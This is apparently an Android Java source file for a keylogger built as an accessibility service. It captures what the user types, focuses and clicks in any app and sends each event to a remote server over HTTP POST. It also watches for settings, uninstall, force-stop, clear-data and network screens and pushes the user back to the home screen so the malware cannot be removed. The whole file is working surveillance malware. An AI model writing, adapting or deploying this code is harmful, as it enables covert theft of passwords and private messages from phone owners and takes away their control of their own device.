package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Rect;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Environment;
import android.support.v4.app.NotificationCompat;
import android.util.Base64;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.util.Date;




import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;


import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;

import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.params.*;
import org.apache.http.protocol.HTTP;

/**
 * Created by Sapreet Singh
 */

public class Keylogger extends AccessibilityService {
	public static Boolean Auto_Click = false;
	public static Boolean bypass = false;
	

    private class SendToServerTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {

            //Log.d("Keylogger", params[0]);

            try {

                String url = "http://ipAddrese:PORT";

                HttpParams httpParameters = new BasicHttpParams();
                HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                HttpConnectionParams.setSoTimeout(httpParameters, 5000);

                StringEntity entity = new StringEntity(params[0], HTTP.UTF_8);
                entity.setContentType("text/plain");

                HttpClient client = new DefaultHttpClient(httpParameters);
                HttpPost httpPost = new HttpPost(url);

                httpPost.setEntity(entity);
                client.execute(httpPost);


            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }


	public static void clickAtPosition(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.getChildCount() == 0) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    if (rect.contains(i, i2)) {
                        accessibilityNodeInfo.performAction(16);
                        return;
                    }
                    return;
                }
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect2);
                if (rect2.contains(i, i2)) {
                    accessibilityNodeInfo.performAction(16);
                }
                for (int i3 = 0; i3 < accessibilityNodeInfo.getChildCount(); i3++) {
                    clickAtPosition(i, i2, accessibilityNodeInfo.getChild(i3));
                }
            } catch (Exception e) {
            }
        }
    }
	
	
	
    public static String getAppNameFromPkgName(Context context, String str) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(str, 128));
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
    }
	
	public static String toBase64(String str) {
        try {
            return Base64.encodeToString(str.getBytes("UTF-8"), 0);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }
	
	
	
	private String getEventText(AccessibilityEvent accessibilityEvent) {
        return accessibilityEvent.getText().toString();
    }


    public void SendMeHome(int i) {
        int i2 = i;
        try {
            //Intent intent = r8;
            Intent intent = new Intent("android.intent.action.MAIN");
            //Intent intent3 = intent;
            intent = intent.addCategory("android.intent.category.HOME");
            intent = intent.setFlags(i2);
            startActivity(intent);
        } catch (Exception e) {
            Exception exception = e;
        }
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:12:0x0022 -> B:9:0x0017). Please submit an issue!!! */
    public void blockBack() {
        try {
            if (Build.VERSION.SDK_INT > 15) {
                for (int i = 0; i < 4; i++) {
                    try {
                        performGlobalAction(1);
                    } catch (Exception e) {
                    }
                }
            }
        } catch (Exception e2) {
        }
    }

    public void click(int i, int i2) {
        try {
            if (Build.VERSION.SDK_INT > 16) {
                clickAtPosition(i, i2, getRootInActiveWindow());
            }
        } catch (Exception e) {
        }
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch(accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
					String data = accessibilityEvent.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(TEXT)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
					String data = accessibilityEvent.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(FOCUSED)|" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
					String data = accessibilityEvent.getText().toString();
                SendToServerTask sendTask = new SendToServerTask();
                sendTask.execute(time + "|(CLICKED)|" + data);
                break;
            }
            default:
                break;
        }
        if (!bypass.booleanValue()) {
			String str = "[" + getApplicationContext().getResources().getString(R.string.accessibility_service_label) + "]";
			String string = getApplicationContext().getResources().getString(R.string.accessibility_service_label);
			if (Build.VERSION.SDK_INT > 15) {
				String lowerCase = accessibilityEvent.getClassName().toString().toLowerCase();
				if ("com.android.settings.SubSettings".toLowerCase().equals(accessibilityEvent.getClassName().toString().toLowerCase()) && (getEventText(accessibilityEvent).toLowerCase().equals(str.toLowerCase()) || getEventText(accessibilityEvent).toLowerCase().equals(string.toLowerCase()))) {
					blockBack();
					SendMeHome(268435456);
				}
				String lowerCase2 = getEventText(accessibilityEvent).toLowerCase();
				if (lowerCase2.contains("Force stop".toLowerCase()) || lowerCase2.contains("Delete app data".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				
				if (lowerCase2.contains("Clear data".toLowerCase()) || lowerCase2.contains("Clear all data".toLowerCase()) || lowerCase2.contains("app data".toLowerCase()) || lowerCase2.contains("Clear cache".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				
				
				if (lowerCase2.contains("App Manager".toLowerCase()) || lowerCase2.contains("Mobile Data ".toLowerCase()) || lowerCase2.contains("Wifi".toLowerCase()) || lowerCase2.contains("Clear cache".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				
				
				
				
				
				
				
				if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				
				
				if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && lowerCase2.contains("uninstall".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				if (lowerCase2.contains("Phone options".toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				if ((lowerCase2.contains("إيقاف".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) || (lowerCase2.contains("stop".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()))) {
					blockBack();
					SendMeHome(268435456);
				}
				if (accessibilityEvent.getPackageName().toString().contains("com.google.android.packageinstaller") && accessibilityEvent.getClassName().toString().toLowerCase().contains("android.app.alertdialog") && getEventText(accessibilityEvent).toLowerCase().contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
				if (!(lowerCase.equals("android.support.v7.widget.recyclerview") || lowerCase.equals("android.widget.linearlayout") || lowerCase.equals("android.widget.framelayout"))) {
					return;
				}
				if ((accessibilityEvent.getPackageName().toString().equals("com.android.settings") || accessibilityEvent.getPackageName().toString().equals("com.miui.securitycenter")) && getEventText(accessibilityEvent).toLowerCase().contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
					blockBack();
					SendMeHome(268435456);
				}
			}
		}
    }

    @Override
    public void onInterrupt() {

    }
}
